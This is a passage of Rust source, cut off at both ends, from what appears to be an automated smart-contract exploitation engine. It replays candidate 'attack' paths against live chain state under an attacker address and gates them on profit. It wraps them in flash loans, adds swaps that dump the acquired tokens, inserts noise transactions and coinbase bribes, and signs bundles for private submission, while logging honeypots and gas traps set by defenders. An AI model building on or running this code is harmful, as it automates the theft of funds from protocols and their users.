                            "[VAULT] Failed to fetch stealth vault balance: {:?}. Dropping bundle.",
                            err
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                }
            }
        }

        // Do not run the pinned-block replay inline on the async runtime thread: it performs RPC
        // and concrete REVM execution and can block the executor hot path.
        let shadow_report = if let Some(report) = verified_shadow_report {
            report
        } else {
            let rpc = self.rpc_url.clone();
            let chain_id = self.chain_id;
            let attacker = attacker_address;
            let params_for_replay = Arc::clone(&params);
            let env_block = intended_env_block;
            match tokio::task::spawn_blocking(move || {
                verifier::replay_path_at_block_with_env(
                    &rpc,
                    chain_id,
                    attacker,
                    params_for_replay.as_ref(),
                    Some(target_solve_block),
                    env_block,
                )
            })
            .await
            {
                Ok(report) => report,
                Err(err) => {
                    eprintln!(
                        "[WARN] Pinned-block replay worker failed: {:?}. Dropping bundle submission.",
                        err
                    );
                    return AttackExecutionFeedback {
                        outcome: AttackOutcome::DroppedPreflight,
                        ..AttackExecutionFeedback::default()
                    };
                }
            }
        };
        let price_confidence_gate_enabled = load_price_confidence_gate_enabled();
        let max_unpriced_tokens = load_price_confidence_max_unpriced_tokens();
        let max_stale_tokens = load_price_confidence_max_stale_tokens();
        feedback.replay_completed_ms = Some(now_ms());
        let (solve_to_replay_max_ms, replay_to_send_max_ms) =
            freshness_sla_budgets_ms(self.chain_id);
        if solve_completed_ms > 0 {
            let solve_to_replay_age = feedback
                .replay_completed_ms
                .unwrap_or(0)
                .saturating_sub(solve_completed_ms);
            if solve_to_replay_age > solve_to_replay_max_ms {
                eprintln!(
                    "[FRESHNESS] Dropping stale payload before send (solve->replay age={}ms > {}ms SLA).",
                    solve_to_replay_age, solve_to_replay_max_ms
                );
                feedback.outcome = AttackOutcome::DroppedStale;
                return feedback;
            }
        }
        if !shadow_report.success {
            let admin_key_required = shadow_report
                .error
                .as_deref()
                .is_some_and(crate::solver::honeypot::is_admin_key_required_revert);
            if admin_key_required {
                if let Some(failed_index) = shadow_report.failed_step {
                    if let Some(step) = params.steps.get(failed_index) {
                        let reason = shadow_report
                            .error
                            .clone()
                            .unwrap_or_else(|| "shadow replay reverted".to_string());
                        crate::solver::honeypot::record_admin_key_required(
                            step.target,
                            &step.call_data,
                            reason,
                        );
                    } else {
                        eprintln!(
                            "[SOUNDNESS] Skipping honeypot marker: failed_step {} out of bounds (steps={}).",
                            failed_index,
                            params.steps.len()
                        );
                    }
                } else {
                    eprintln!(
                        "[SOUNDNESS] Skipping honeypot marker: missing failed_step in shadow report."
                    );
                }
            }
            let mut gas_grief_detected = false;
            if !admin_key_required {
                let shadow_failure = crate::solver::gas_grief::ShadowFailureReport {
                    success: shadow_report.success,
                    failure_gas_used: shadow_report.failure_gas_used,
                    failure_gas_limit: shadow_report.failure_gas_limit,
                    halt_reason: shadow_report.halt_reason.clone(),
                };
                if let Some((class, reason, gas_used, gas_limit)) =
                    crate::solver::gas_grief::classify_shadow_failure(&shadow_failure)
                {
                    if let Some(failed_index) = shadow_report.failed_step {
                        if let Some(step) = params.steps.get(failed_index) {
                            crate::solver::gas_grief::record_gas_grief(
                                step.target,
                                &step.call_data,
                                class,
                                reason,
                                gas_used,
                                gas_limit,
                            );
                        } else {
                            eprintln!(
                                "[SOUNDNESS] Skipping gas-grief marker: failed_step {} out of bounds (steps={}).",
                                failed_index,
                                params.steps.len()
                            );
                        }
                    } else {
                        eprintln!(
                            "[SOUNDNESS] Skipping gas-grief marker: missing failed_step in shadow report."
                        );
                    }
                    gas_grief_detected = true;
                }
            }
            let inserted_lemma = build_soundness_lemma_from_shadow_failure(&params, &shadow_report);
            if let Some(err) = shadow_report.error.as_deref() {
                feedback.reverted = Some(looks_like_revert_error(err));
            }
            eprintln!(
                "[-] Shadow Simulation failed at step {:?}: {:?}. Aborting.",
                shadow_report.failed_step, shadow_report.error
            );
            if let Some(lemma) = inserted_lemma {
                eprintln!(
                    "[SOUNDNESS] Learned lemma: block selector 0x{} for contract {:?} ({})",
                    hex::encode(lemma.selector),
                    lemma.contract,
                    lemma.reason
                );
                feedback.learned_lemma = true;
                feedback.outcome = if admin_key_required {
                    AttackOutcome::DroppedHoneypot
                } else if gas_grief_detected {
                    AttackOutcome::DroppedGasGrief
                } else {
                    AttackOutcome::DroppedShadowFail
                };
                return feedback;
            }
            feedback.outcome = if admin_key_required {
                AttackOutcome::DroppedHoneypot
            } else if gas_grief_detected {
                AttackOutcome::DroppedGasGrief
            } else {
                AttackOutcome::DroppedShadowFail
            };
            return feedback;
        }

        if price_confidence_gate_enabled
            && (shadow_report.unpriced_tokens > max_unpriced_tokens
                || shadow_report.stale_priced_tokens > max_stale_tokens)
        {
            eprintln!(
                "[-] Shadow valuation confidence gate failed (priced_tokens={}, unpriced_tokens={}, stale_priced_tokens={}, max_unpriced={}, max_stale={}). Aborting.",
                shadow_report.priced_tokens,
                shadow_report.unpriced_tokens,
                shadow_report.stale_priced_tokens,
                max_unpriced_tokens,
                max_stale_tokens
            );
            feedback.outcome = AttackOutcome::DroppedPriceConfidence;
            return feedback;
        }

        if !shadow_report.profitable {
            println!(
                "[-] Shadow Simulation completed but was unprofitable (initial_eth={}, final_eth={}, initial_value_wei={}, final_value_wei={}, gas_cost_wei={}, priced_tokens={}, unpriced_tokens={}, stale_priced_tokens={}, token_deltas={}). Aborting.",
                shadow_report.initial_eth,
                shadow_report.final_eth,
                shadow_report.initial_value_wei,
                shadow_report.final_value_wei,
                shadow_report.gas_cost_wei,
                shadow_report.priced_tokens,
                shadow_report.unpriced_tokens,
                shadow_report.stale_priced_tokens,
                summarize_token_deltas(&shadow_report.token_deltas)
            );
            feedback.outcome = AttackOutcome::DroppedUnprofitable;
            return feedback;
        }
        feedback.reverted = Some(false);
        let mut dumpable_gain_wei = None;
        let mut dumper_swaps = if load_dumper_enabled() {
            let swaps = build_dumper_swaps(
                self.chain_id,
                &shadow_report.token_deltas,
                shadow_report.gas_cost_wei,
            );
            if swaps.is_empty() {
                Vec::new()
            } else {
                if get_dumper_router(self.chain_id).is_none() {
                    eprintln!(
                        "[-] Dumper is enabled but no router is configured for chain_id={}. Dropping bundle.",
                        self.chain_id
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
                match verifier::estimate_dumpable_token_gain_eth_wei(
                    self.chain_id,
                    &shadow_report.token_deltas,
                ) {
                    Some(gain_wei) => {
                        dumpable_gain_wei = Some(gain_wei);
                        if gain_wei <= shadow_report.gas_cost_wei {
                            eprintln!(
                                "[-] Dumper gate rejected candidate path: dumpable_gain_wei={} <= gas_cost_wei={}.",
                                gain_wei,
                                shadow_report.gas_cost_wei
                            );
                            feedback.outcome = AttackOutcome::DroppedUnprofitable;
                            return feedback;
                        }
                    }
                    None => {
                        eprintln!(
                            "[-] Dumper gate rejected candidate path: unable to price one or more dumpable tokens."
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                }
                swaps
            }
        } else {
            Vec::new()
        };

        if !self.submission_enabled {
            println!(
                "[SIM] Shadow replay succeeded and is profitable. Skipping private submission construction."
            );
            feedback.outcome = AttackOutcome::SimulatedOnly;
            return feedback;
        }

        // Conditional bundle execution: only proceed when declared storage slot predicates hold.
        let mut latest_head_block: Option<u64> = prefetched_head_block;
        let mut conditional_checks = Vec::new();
        let mut seen_conditional = HashMap::<(Address, U256), U256>::new();
        for step in &params.steps {
            if let Some(cond) = &step.execute_if {
                let key = (step.target, cond.slot);
                if let Some(prev) = seen_conditional.get(&key).copied() {
                    if prev != cond.equals {
                        eprintln!(
                            "[COND] Conflicting execute_if predicates for contract={:#x} slot={} ({} vs {}). Dropping bundle submission.",
                            step.target,
                            cond.slot,
                            prev,
                            cond.equals
                        );
                        feedback.outcome = AttackOutcome::DroppedConditional;
                        feedback.included = Some(false);
                        return feedback;
                    }
                    continue;
                }
                seen_conditional.insert(key, cond.equals);
                conditional_checks.push((step.target, cond.slot, cond.equals));
            }
        }
        if !conditional_checks.is_empty() {
            if conditional_checks.len() > MAX_CONDITIONAL_STORAGE_CHECKS {
                eprintln!(
                    "[COND] Too many execute_if predicates ({} > {}). Dropping bundle submission.",
                    conditional_checks.len(),
                    MAX_CONDITIONAL_STORAGE_CHECKS
                );
                feedback.outcome = AttackOutcome::DroppedConditional;
                feedback.included = Some(false);
                return feedback;
            }
            let head = if let Some(head) = latest_head_block {
                head
            } else {
                match RobustRpc::get_block_number_with_retry_ref(&self.provider, 2).await {
                    Ok(head) => {
                        latest_head_block = Some(head);
                        head
                    }
                    Err(err) => {
                        eprintln!(
                            "[COND] Failed to fetch head for execute_if checks (solve_block={}): {:?}. Dropping bundle submission.",
                            target_solve_block,
                            err
                        );
                        feedback.outcome = AttackOutcome::DroppedConditional;
                        feedback.included = Some(false);
                        return feedback;
                    }
                }
            };
            let mut unique_reads = Vec::with_capacity(conditional_checks.len());
            let mut seen_reads = HashMap::<(Address, U256), ()>::new();
            for (contract, slot, _) in &conditional_checks {
                if seen_reads.insert((*contract, *slot), ()).is_none() {
                    unique_reads.push((*contract, *slot));
                }
            }
            let prefetch_timeout_ms = load_conditional_storage_prefetch_timeout_ms();
            let prefetch_concurrency = load_conditional_storage_prefetch_concurrency();
            let prefetch = tokio::time::timeout(
                Duration::from_millis(prefetch_timeout_ms),
                async {
                    let mut cache = HashMap::<(Address, U256), U256>::new();
                    for chunk in unique_reads.chunks(prefetch_concurrency.max(1)) {
                        let mut tasks = Vec::with_capacity(chunk.len());
                        for (contract, slot) in chunk.iter().copied() {
                            let pool = self.hydration_pool.clone();
                            tasks.push(tokio::spawn(async move {
                                let value =
                                    RobustRpc::get_storage_at_block_with_hydration_pool_retry(
                                        &pool, contract, slot, head, 2,
                                    )
                                    .await;
                                (contract, slot, value)
                            }));
                        }
                        for task in tasks {
                            match task.await {
                                Ok((contract, slot, Ok(value))) => {
                                    cache.insert((contract, slot), value);
                                }
                                Ok((contract, slot, Err(err))) => {
                                    return Err(format!(
                                        "storage fetch failed (contract={:#x}, slot={}, head={}): {:?}",
                                        contract, slot, head, err
                                    ));
                                }
                                Err(err) => {
                                    return Err(format!(
                                        "prefetch task join failed (head={}): {:?}",
                                        head, err
                                    ));
                                }
                            }
                        }
                    }
                    Ok::<HashMap<(Address, U256), U256>, String>(cache)
                },
            )
            .await;
            let cache = match prefetch {
                Ok(Ok(cache)) => cache,
                Ok(Err(err)) => {
                    eprintln!(
                        "[COND] execute_if prefetch failed: {}. Dropping bundle submission.",
                        err
                    );
                    feedback.outcome = AttackOutcome::DroppedConditional;
                    feedback.included = Some(false);
                    return feedback;
                }
                Err(_) => {
                    eprintln!(
                        "[COND] execute_if prefetch timed out after {}ms (predicates={}, unique_reads={}). Dropping bundle submission.",
                        prefetch_timeout_ms,
                        conditional_checks.len(),
                        unique_reads.len()
                    );
                    feedback.outcome = AttackOutcome::DroppedConditional;
                    feedback.included = Some(false);
                    return feedback;
                }
            };
            for (contract, slot, equals) in conditional_checks {
                let Some(observed) = cache.get(&(contract, slot)).copied() else {
                    eprintln!(
                        "[COND] Missing prefetched storage value for execute_if (contract={:#x}, slot={}, head={}). Dropping bundle submission.",
                        contract,
                        slot,
                        head
                    );
                    feedback.outcome = AttackOutcome::DroppedConditional;
                    feedback.included = Some(false);
                    return feedback;
                };
                if observed != equals {
                    eprintln!(
                        "[COND] execute_if failed (contract={:#x}, slot={}, expected={}, observed={}, head={}). Dropping bundle submission.",
                        contract,
                        slot,
                        equals,
                        observed,
                        head
                    );
                    feedback.outcome = AttackOutcome::DroppedConditional;
                    feedback.included = Some(false);
                    return feedback;
                }
            }
        }

        // SOUNDNESS: concrete verification on latest state immediately before bundle construction.
        // This is separate from the pinned-block replay and exists to fail-closed on head drift.
        if load_realtime_replay_validation_enabled() {
            let timeout_ms = load_realtime_replay_validation_timeout_ms();
            let rpc = self.rpc_url.clone();
            let params_for_replay = Arc::clone(&params);
            let chain_id = self.chain_id;
            let attacker = attacker_address;
            let env_block = intended_env_block;
            let replay = tokio::task::spawn_blocking(move || {
                let _ = env_block;
                verifier::replay_path(&rpc, chain_id, attacker, params_for_replay.as_ref())
            });
            let report = match tokio::time::timeout(
                std::time::Duration::from_millis(timeout_ms),
                replay,
            )
            .await
            {
                Ok(Ok(report)) => report,
                Ok(Err(err)) => {
                    eprintln!(
                            "[REALTIME] Latest-state replay worker failed: {:?}. Dropping private submission.",
                        err
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
                Err(_) => {
                    eprintln!(
                            "[REALTIME] Latest-state replay timed out after {}ms. Dropping private submission.",
                        timeout_ms
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
            };
            feedback.replay_completed_ms = Some(now_ms());

            // Permit non-profitable replay outcomes for audit-signaled findings (`expected_profit == 1`).
            let is_audit_signal = params.expected_profit == Some(revm::primitives::U256::from(1));
            let success_gate = report.success || is_audit_signal; // Audits might not "succeed" in a traditional sense if they revert to signal
            let profit_gate = report.profitable || is_audit_signal;

            if !success_gate || !profit_gate {
                eprintln!(
                    "[REALTIME] Latest-state replay failed (success={}, profitable={}, audit={}, initial_eth={}, final_eth={}, initial_value_wei={}, final_value_wei={}, gas_cost_wei={}, priced_tokens={}, unpriced_tokens={}, stale_priced_tokens={}, token_deltas={}). Dropping private submission.",
                    report.success,
                    report.profitable,
                    is_audit_signal,
                    report.initial_eth,
                    report.final_eth,
                    report.initial_value_wei,
                    report.final_value_wei,
                    report.gas_cost_wei,
                    report.priced_tokens,
                    report.unpriced_tokens,
                    report.stale_priced_tokens,
                    summarize_token_deltas(&report.token_deltas)
                );
                feedback.outcome = AttackOutcome::DroppedPreflight;
                return feedback;
            }
        }

        let mut estimated_gas = shadow_report.estimated_gas;
        // Ensure estimated_gas is reasonable
        if estimated_gas == 0 {
            estimated_gas = gas_solver::DEFAULT_GAS_ESTIMATE;
        }

        // Dynamic Gas Pricing
        let gas_probe_started = Instant::now();
        let gas_opt = self.gas_opt_snapshot().await;
        let gas_probe_latency_ms = gas_probe_started.elapsed().as_millis() as u64;
        if self.submission_enabled && gas_opt.head_block.is_none() {
            eprintln!(
                "[-] Dropping private submission attempt: unable to fetch reliable fee-history head for gas pricing."
            );
            feedback.outcome = AttackOutcome::DroppedPreflight;
            return feedback;
        }
        let mut expected_profit_wei = match params.expected_profit {
            Some(p) => u256_to_u128_saturating(p),
            None => {
                if self.submission_enabled {
                    eprintln!(
                        "[-] Dropping private submission attempt: expected_profit is missing (cannot price safely)."
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
                0
            }
        };
        let bribe_threshold_wei = u256_to_u128_saturating(load_coinbase_bribe_threshold_wei());
        let coinbase_bribe_wei = if self.submission_enabled
            && load_coinbase_bribe_enabled()
            && self.coinbase_bribe_route_enabled
            && expected_profit_wei >= bribe_threshold_wei
        {
            expected_profit_wei.saturating_mul(load_coinbase_bribe_bps() as u128) / 10_000
        } else {
            0
        };
        if self.submission_enabled && !dumper_swaps.is_empty() {
            let required_native_wei = shadow_report
                .gas_cost_wei
                .saturating_add(revm::primitives::U256::from(coinbase_bribe_wei));
            if let Some(gain_wei) = dumpable_gain_wei {
                if gain_wei <= required_native_wei {
                    eprintln!(
                        "[-] Dumper gate rejected candidate path: dumpable_gain_wei={} <= required_native_wei={} (gas+tip).",
                        gain_wei,
                        required_native_wei
                    );
                    feedback.outcome = AttackOutcome::DroppedUnprofitable;
                    return feedback;
                }
            }
            repartition_dumper_min_out(&mut dumper_swaps, revm_u256_to_alloy(required_native_wei));
        }
        if gas_solver::is_opstack_chain(self.chain_id) && expected_profit_wei > 0 {
            let strict_l1_fee = load_opstack_l1_fee_strict_enabled();
            // High-fidelity OP-stack L1 fee model uses calldata byte-level gas (zero/nonzero)
            // plus oracle parameters (overhead/scalar/decimals).
            let (calldata_gas, calldata_len) = gas_solver::opstack_l1_calldata_gas_chunks(
                params.steps.iter().map(|step| step.call_data.as_ref()),
            );
            let block_number = match gas_opt.head_block.or(prefetched_head_block) {
                Some(block) => block,
                None => {
                    if strict_l1_fee {
                        eprintln!(
                            "[-] Dropping: strict OP-stack L1 fee enabled but fee-history head is unavailable (solve_block={}, calldata_len={}).",
                            target_solve_block,
                            calldata_len
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                    eprintln!(
                        "[WARN] Skipping OP-stack L1 fee estimate: fee-history head unavailable (solve_block={}, calldata_len={}).",
                        target_solve_block,
                        calldata_len
                    );
                    0
                }
            };
            if block_number == 0 {
                // Non-strict mode: continue without an L1 fee estimate.
                // (Strict mode returns above.)
            } else {
                match gas_solver::estimate_opstack_l1_fee_wei_exact_cached_from_gas(
                    &self.rpc_url,
                    self.chain_id,
                    block_number,
                    calldata_gas,
                )
                .await
                {
                    Some(fee) => {
                        expected_profit_wei = expected_profit_wei.saturating_sub(fee);
                        println!(
                        "[L1FEE] opstack_chain=1 block={} calldata_len={} l1_fee_wei={} adjusted_expected_profit_wei={}",
                        block_number,
                        calldata_len,
                        fee,
                        expected_profit_wei
                    );
                        if expected_profit_wei == 0 {
                            eprintln!(
                                "[-] Dropping: unprofitable after OP-stack L1 fee (l1_fee_wei={}).",
                                fee
                            );
                            feedback.outcome = AttackOutcome::DroppedUnprofitable;
                            return feedback;
                        }
                    }
                    None if strict_l1_fee => {
                        eprintln!(
                        "[-] Dropping: strict OP-stack L1 fee enabled but oracle params could not be retrieved (block={}, calldata_len={}).",
                        block_number,
                        calldata_len
                    );
                        feedback.outcome = AttackOutcome::DroppedUnprofitable;
                        return feedback;
                    }
                    None => {
                        eprintln!(
                        "[WARN] Proceeding without OP-stack L1 fee (block={}, calldata_len={}) due to OPSTACK_L1_FEE_STRICT=false.",
                        block_number,
                        calldata_len
                    );
                    }
                }
            }
        }
        let mut defensive_mode = false;
        if load_volatility_circuit_breaker_enabled() {
            let loss_streak = volatility_loss_streak().load(Ordering::Relaxed);
            let base_fee_trip = gas_opt.base_fee > load_volatility_base_fee_threshold_wei();
            let loss_trip = loss_streak > load_volatility_consecutive_losses_threshold();
            let rpc_trip = gas_probe_latency_ms > load_volatility_rpc_latency_threshold_ms();
            defensive_mode = base_fee_trip || loss_trip || rpc_trip;
            if defensive_mode {
                tip_auto_scale_contested = false;
                tracing::warn!(
                    "[RISK] Volatility circuit breaker enabled defensive mode (base_fee={}, loss_streak={}, rpc_latency_ms={}).",
                    gas_opt.base_fee,
                    loss_streak,
                    gas_probe_latency_ms
                );
            }
        }
        let tip_budget_profit_wei = expected_profit_wei.saturating_sub(coinbase_bribe_wei);
        if self.submission_enabled && tip_budget_profit_wei == 0 {
            eprintln!(
                "[-] Dropping: coinbase bribe consumed all expected profit (expected_profit_wei={}, coinbase_bribe_wei={}).",
                expected_profit_wei,
                coinbase_bribe_wei
            );
            feedback.outcome = AttackOutcome::DroppedUnprofitable;
            return feedback;
        }
        let mut tip = gas_opt.optimal_tip_auto_scaled(
            tip_budget_profit_wei,
            estimated_gas,
            tip_auto_scale_contested,
        );
        if defensive_mode {
            tip = tip.saturating_mul(load_volatility_defensive_tip_scale_bps() as u128) / 10_000;
        }
        let max_fee = gas_opt.max_fee_per_gas(tip);
        feedback.tip_wei = Some(tip);
        feedback.max_fee_wei = Some(max_fee);

        println!(
            "[GAS] base_fee={}  tip={}  max_fee={}  est_gas={}",
            gas_opt.base_fee, tip, max_fee, estimated_gas
        );
        crate::utils::blackbox::record(
            "gas",
            "gas_quote",
            Some(serde_json::json!({
                "base_fee_wei": gas_opt.base_fee,
                "tip_wei": tip,
                "max_fee_wei": max_fee,
                "estimated_gas": estimated_gas,
                "target": format!("{target:?}"),
            })),
        );
        if self.submission_enabled && load_dynamic_gas_escrow_enabled() {
            match verifier::dynamic_gas_escrow_sufficient(
                &self.provider,
                attacker_address,
                estimated_gas,
                revm::primitives::U256::from(coinbase_bribe_wei),
            )
            .await
            {
                Ok((true, _, _)) => {}
                Ok((false, balance_wei, required_wei)) => {
                    eprintln!(
                        "[RISK] Dynamic gas escrow guard blocked execution: balance={} < required={} (estimated_gas={}, coinbase_bribe_wei={}, target={:?}).",
                        balance_wei,
                        required_wei,
                        estimated_gas,
                        coinbase_bribe_wei,
                        target
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
                Err(err) => {
                    eprintln!(
                        "[RISK] Dynamic gas escrow probe failed: {:?}. Dropping bundle.",
                        err
                    );
                    feedback.outcome = AttackOutcome::DroppedPreflight;
                    return feedback;
                }
            }
        }

        // Build Multi-Block Executor
        let mb_executor =
            multi_block::MultiBlockExecutor::new(&params.steps, params.block_offsets.as_deref());

        // Bundle assembly path: sign transactions grouped by block
        let mut signed_txs_by_group = std::collections::BTreeMap::new();
        if let Some(ref signer) = self.signer {
            // Never hold the nonce mutex across an `.await` (force_sync_nonce re-locks it).
            let cached = { *self.nonce_cache.lock().await };
            let mut nonce = match cached {
                Some(n) => n,
                None => match self.force_sync_nonce(signer.address()).await {
                    Ok(nonce) => nonce,
                    Err(err) => {
                        eprintln!(
                            "[-] Failed to sync nonce for signer {:#x}: {:?}. Dropping bundle.",
                            signer.address(),
                            err
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                },
            };

            let grouped = mb_executor.grouped_steps();
            let final_block_offset = grouped.keys().next_back().copied().unwrap_or(0);
            let flash_loan_route_count = collapsed_flash_loan_routes(
                crate::config::chains::ChainConfig::get(self.chain_id).weth,
                params.as_ref(),
            )
            .len();
            if self.submission_enabled && flash_loan_route_count > 1 {
                eprintln!(
                    "[-] Dropping: candidate path requires {} flash-loan routes but executor supports a single wrapped route.",
                    flash_loan_route_count
                );
                feedback.outcome = AttackOutcome::DroppedPreflight;
                return feedback;
            }
            let mut attack_providers =
                crate::protocols::flash_loan::get_default_providers(self.chain_id);
            let mut attack_provider_specs = if self.flash_loan_provider_specs.is_empty() {
                flash_loan_provider_specs_by_address(self.chain_id)
            } else {
                self.flash_loan_provider_specs.clone()
            };
            for spec in crate::protocols::flash_loan::provider_specs_for_chain(self.chain_id) {
                attack_provider_specs.insert(spec.address, spec);
            }
            if self.submission_enabled && flash_loan_required(params.as_ref()) {
                let discovered_specs = discover_flash_loan_specs_from_factories(
                    self.chain_id,
                    &self.provider,
                    &attack_provider_specs,
                    params.as_ref(),
                )
                .await;
                for spec in discovered_specs {
                    attack_provider_specs.insert(spec.address, spec);
                    insert_provider_from_spec(self.chain_id, &mut attack_providers, &spec);
                }
            }
            let flash_loan_plan = select_flash_loan_plan_with_capacity(
                self.chain_id,
                &self.provider,
                &attack_providers,
                &attack_provider_specs,
                params.as_ref(),
            )
            .await;
            if flash_loan_required(params.as_ref()) && flash_loan_plan.is_none() {
                eprintln!(
                    "[-] Dropping: flash-loan-required candidate path has no realizable provider route (capacity/token compatibility gate)."
                );
                feedback.outcome = AttackOutcome::DroppedPreflight;
                return feedback;
            }
            let wallet = EthereumWallet::from(signer.clone());
            let access_list_budget = access_list::AccessListBudget::start(now_ms());
            let access_list_max_txs_per_group = access_list::max_txs_per_group();
            for (block_offset, steps) in &grouped {
                let mut group_txs: Vec<AlloyBytes> = Vec::new();
                for (idx, block_step) in steps.iter().enumerate() {
                    let step = &block_step.step;
                    let mut tx_request = TransactionRequest::default()
                        .with_to(step.target)
                        .with_input(step.call_data.clone())
                        .with_chain_id(self.chain_id)
                        .with_nonce(nonce)
                        .with_max_priority_fee_per_gas(tip)
                        .with_max_fee_per_gas(max_fee);
                    tx_request.from = Some(signer.address());

                    // Flash loan wrapping for first step in first block only.
                    if *block_offset == 0 && idx == 0 {
                        if let Some(plan) = flash_loan_plan {
                            if let Some(provider) = attack_providers.get(&plan.provider) {
                                if let Ok(data) = provider.encode_loan(
                                    plan.token,
                                    plan.amount,
                                    step.target,
                                    step.call_data.clone(),
                                ) {
                                    tx_request =
                                        tx_request.with_to(provider.address()).with_input(data);
                                }
                            }
                        }
                    }

                    if idx < access_list_max_txs_per_group {
                        match access_list::maybe_attach_access_list_best_effort(
                            &self.provider,
                            &mut tx_request,
                            &access_list_budget,
                            now_ms(),
                        )
                        .await
                        {
                            Ok(true) => {
                                if let Some(ref al) = tx_request.access_list {
                                    let keys: usize =
                                        al.iter().map(|item| item.storage_keys.len()).sum();
                                    println!(
                                        "[ACCESSLIST] Attached items={} keys={} (offset={}, idx={}).",
                                        al.len(),
                                        keys,
                                        block_offset,
                                        idx
                                    );
                                }
                            }
                            Ok(false) => {}
                            Err(err) => {
                                eprintln!(
                                    "[-] Access list generation failed (strict): {:?}. Dropping bundle.",
                                    err
                                );
                                feedback.outcome = AttackOutcome::DroppedPreflight;
                                return feedback;
                            }
                        }
                    }

                    if let Ok(signed) = tx_request.build(&wallet).await {
                        group_txs.push(AlloyBytes::from(signed.encoded_2718()));
                        nonce += 1;
                    }
                }

                if self.submission_enabled {
                    let before_noise = group_txs.len();
                    append_noise_transactions(
                        signer,
                        self.chain_id,
                        *block_offset,
                        tip,
                        max_fee,
                        &mut nonce,
                        &mut group_txs,
                    )
                    .await;
                    let noise_added = group_txs.len().saturating_sub(before_noise);
                    if noise_added > 0 {
                        println!(
                            "[BUNDLE] Added {} noise tx(s) for block offset {}.",
                            noise_added, block_offset
                        );
                    }
                }
                if self.submission_enabled && *block_offset == final_block_offset && !dumper_swaps.is_empty()
                {
                    match append_dumper_transactions(
                        signer,
                        self.chain_id,
                        tip,
                        max_fee,
                        &mut nonce,
                        &mut group_txs,
                        &dumper_swaps,
                    )
                    .await
                    {
                        Ok(appended) => {
                            println!(
                                "[DUMPER] Appended {} atomic exit tx(s) at final block offset {}.",
                                appended, block_offset
                            );
                        }
                        Err(err) => {
                            eprintln!(
                                "[-] Dumper transaction construction failed at final block offset {}: {}. Dropping bundle.",
                                block_offset, err
                            );
                            feedback.outcome = AttackOutcome::DroppedPreflight;
                            return feedback;
                        }
                    }
                }
                if self.submission_enabled
                    && *block_offset == final_block_offset
                    && !dumper_swaps.is_empty()
                    && load_dumper_unwrap_to_native()
                {
                    let unwrap_wei = dumper_min_out_total(&dumper_swaps);
                    match append_dumper_native_unwrap_transaction(
                        signer,
                        self.chain_id,
                        tip,
                        max_fee,
                        &mut nonce,
                        &mut group_txs,
                        unwrap_wei,
                    )
                    .await
                    {
                        Ok(true) => {
                            println!(
                                "[DUMPER] Appended native unwrap tx (min_unwrap_wei={}) at final block offset {}.",
                                unwrap_wei, block_offset
                            );
                        }
                        Ok(false) => {}
                        Err(err) => {
                            eprintln!(
                                "[-] Dumper native unwrap transaction construction failed at final block offset {}: {}. Dropping bundle.",
                                block_offset, err
                            );
                            feedback.outcome = AttackOutcome::DroppedPreflight;
                            return feedback;
                        }
                    }
                }
                if self.submission_enabled && *block_offset == final_block_offset && coinbase_bribe_wei > 0 {
                    match append_coinbase_bribe_transaction(
                        signer,
                        self.chain_id,
                        tip,
                        max_fee,
                        &mut nonce,
                        &mut group_txs,
                        U256::from(coinbase_bribe_wei),
                    )
                    .await
                    {
                        Ok(true) => {
                            println!(
                                "[BRIBE] Appended direct coinbase-bribe tx (wei={}) at final block offset {}.",
                                coinbase_bribe_wei, block_offset
                            );
                        }
                        Ok(false) => {}
                        Err(err) => {
                            eprintln!(
                                "[-] Coinbase bribe transaction construction failed at final block offset {}: {}. Dropping bundle.",
                                block_offset, err
                            );
                            feedback.outcome = AttackOutcome::DroppedPreflight;
                            return feedback;
                        }
                    }
                }

                signed_txs_by_group.insert(*block_offset, group_txs);
            }
            *self.nonce_cache.lock().await = Some(nonce);
        }

        if self.submission_enabled && !signed_txs_by_group.is_empty() {
            if require_late_solve_preflight && !load_realtime_replay_validation_enabled() {
                println!(
                    "[PRE-FLIGHT] Slow solve detected ({}ms). Re-verifying candidate path on latest state before private submission.",
                    solve_duration_ms
                );
                let timeout_ms = load_realtime_replay_validation_timeout_ms();
                let rpc = self.rpc_url.clone();
                let params_for_replay = Arc::clone(&params);
                let chain_id = self.chain_id;
                let attacker = attacker_address;
                let env_block = intended_env_block;
                let replay = tokio::task::spawn_blocking(move || {
                    verifier::replay_path_with_env(
                        &rpc,
                        chain_id,
                        attacker,
                        params_for_replay.as_ref(),
                        env_block,
                    )
                });
                let preflight_report = match tokio::time::timeout(
                    std::time::Duration::from_millis(timeout_ms),
                    replay,
                )
                .await
                {
                    Ok(Ok(report)) => report,
                    Ok(Err(err)) => {
                        eprintln!(
                            "[PRE-FLIGHT] Late-solve replay worker failed: {:?}. Dropping private submission.",
                            err
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                    Err(_) => {
                        eprintln!(
                            "[PRE-FLIGHT] Late-solve replay timed out after {}ms. Dropping private submission.",
                            timeout_ms
                        );
                        feedback.outcome = AttackOutcome::DroppedPreflight;
                        return feedback;
                    }
                };
                feedback.replay_completed_ms = Some(now_ms());
                if !preflight_report.success || !preflight_report.profitable {
                    if shadow_report.success && shadow_report.profitable {
                        eprintln!(
                            "[DRIFT] Pinned-block replay was profitable at solve_block={}, but latest-state preflight failed (success={}, profitable={}).",
                            target_solve_block,
                            preflight_report.success,
                            preflight_report.profitable
                        );
                    }
                    eprintln!(
                        "[PRE-FLIGHT] Late-solve re-verification failed (success={}, profitable={}, initial_eth={}, final_eth={}, initial_value_wei={}, final_value_wei={}, gas_cost_wei={}, priced_tokens={}, unpriced_tokens={}, stale_priced_tokens={}, token_deltas={}). Dropping private submission.",
                        preflight_report.success,
                        preflight_report.profitable,
                        preflight_report.initial_eth,
                        preflight_report.final_eth,
                        preflight_report.initial_value_wei,
                        preflight_report.final_value_wei,
                        preflight_report.gas_cost_wei,
                        preflight_report.priced_tokens,
                        preflight_report.unpriced_tokens,
